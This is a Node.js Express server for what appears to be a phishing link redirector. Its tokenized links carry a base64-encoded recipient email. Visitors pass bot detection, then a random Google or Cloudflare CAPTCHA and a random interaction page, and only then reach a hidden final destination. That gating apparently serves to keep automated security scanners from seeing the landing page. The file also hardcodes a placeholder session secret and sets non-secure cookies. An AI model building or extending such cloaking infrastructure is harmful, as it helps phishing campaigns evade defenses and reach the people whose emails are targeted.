const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const { botDetectionMiddleware } = require('./middleware/botDetection');
const path = require('path');
const axios = require('axios');
const { redirectController, generateTokenController, generateToken } = require('./controllers/redirect');
const verifySessionMiddleware = require('./middleware/verifySessionMiddleware');
const { isValidUrl } = require('./utils/urlUtils');
const { captchaMiddleware } = require('./middleware/captchaMiddleware');
const session = require('express-session');
const qs = require('querystring')

const app = express();

// Add this near the top with other constants
const DEFAULT_REDIRECT_URL = process.env.DEFAULT_REDIRECT_URL || 'https://example.com';
const DEFAULT_EXPIRE_TIME = 2000; // 2 seconds

// Security middleware
app.use(
    helmet.contentSecurityPolicy({
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          "'unsafe-inline'", // Allows inline scripts
          "https://www.google.com",
          "https://www.gstatic.com",
          "https://challenges.cloudflare.com",
        ],
        scriptSrcAttr: [
          "'self'",
          "'unsafe-inline'", // Allows inline event handlers
        ],
        frameSrc: [
          "'self'",
          "https://www.google.com",
          "https://www.gstatic.com",
          "https://challenges.cloudflare.com",
        ],
        styleSrc: [
          "'self'",
          "'unsafe-inline'", // Allows inline styles
        ],
      },
    })
);



//app.use(cors());
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));
app.set('views', 'src/views');
app.use(express.json()); // For parsing JSON
app.use(express.urlencoded({ extended: true }));

app.use(
    session({
      secret: 'your-secret-key', // Replace with a secure key
      resave: false,
      saveUninitialized: true,
      cookie: { secure: false }, // Set `secure: true` if using HTTPS
    })
);

// Rate limiting
const limiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 50 // limit each IP to 50 requests per window
});
app.use(limiter);

function decodeEmailMiddleware(req, res, next){
  const hashIndex = req.url.indexOf('#');
  if (hashIndex !== -1) {
    const fragment = req.url.slice(hashIndex + 1); // Extract everything after '#'
    const rawFragment = fragment.slice(1); // Remove the first letter after '#'

    // Attempt to decode email (base64 or raw)
    try {
      const email = Buffer.from(rawFragment, 'base64').toString('utf8');
      req.email = email; // Attach decoded email to the request object
    } catch (error) {
      console.error('Error decoding email:', error);
      return res.status(400).send('Invalid email format');
    }
  }
  next();
}

// Routes
app.post('/generate', limiter, generateTokenController);
app.get('/r/:token/:base64Email?', decodeEmailMiddleware, botDetectionMiddleware, redirectController);

app.get('/captcha', verifySessionMiddleware, (req, res) => {
  const providers = ['google', 'cloudflare'];
  const selectedProvider = providers[Math.floor(Math.random() * providers.length)];
  req.session.captchaProvider = selectedProvider;

  res.render('captcha', { provider: selectedProvider });
});

app.post('/captcha/validate', verifySessionMiddleware, async (req, res) => {
  const { 'g-recaptcha-response': googleCaptchaResponse, 'cf-turnstile-response': cloudflareCaptchaResponse, provider } = req.body;

  const captchaResponse =
      provider === 'google' ? googleCaptchaResponse : cloudflareCaptchaResponse;

  if (!captchaResponse || !provider) {
    return res.status(400).json({ error: 'Missing CAPTCHA response or provider' });
  }

  try {
    let verificationUrl;
    let secretKey;

    if (provider === 'google') {
      verificationUrl = 'https://www.google.com/recaptcha/api/siteverify';
      secretKey = process.env.GOOGLE_RECAPTCHA_SECRET_KEY;
    } else if (provider === 'cloudflare') {
      verificationUrl = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
      secretKey = process.env.CLOUDFLARE_TURNSTILE_SECRET_KEY;
    } else {
      return res.status(400).json({ error: 'Invalid CAPTCHA provider' });
    }

    const qs = require('querystring');
    const requestBody = qs.stringify({
      secret: secretKey,
      response: captchaResponse,
    });

    const response = await axios.post(verificationUrl, requestBody, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });

    if (!response.data.success) {
      return res.status(403).json({ error: 'CAPTCHA validation failed', details: response.data['error-codes'] });
    }

    req.session.captchaPassed = true;
    res.redirect(req.session.nextStep || '/');
  } catch (error) {
    console.error('CAPTCHA validation error:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/interaction', verifySessionMiddleware, (req, res) => {
  const pages = ['2a', '2b', '2c', '2d', '2e'];
  const randomPage = pages[Math.floor(Math.random() * pages.length)];
  res.render(randomPage);
});

app.post('/interaction/complete', verifySessionMiddleware, (req, res) => {
  req.session.page2Completed = true;

  // Redirect back to the redirectController
  const nextStep = req.session.finalDestination || '/';
  res.status(200).json({ redirectUrl: nextStep }); // Send the next step URL
});

// Error handling
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
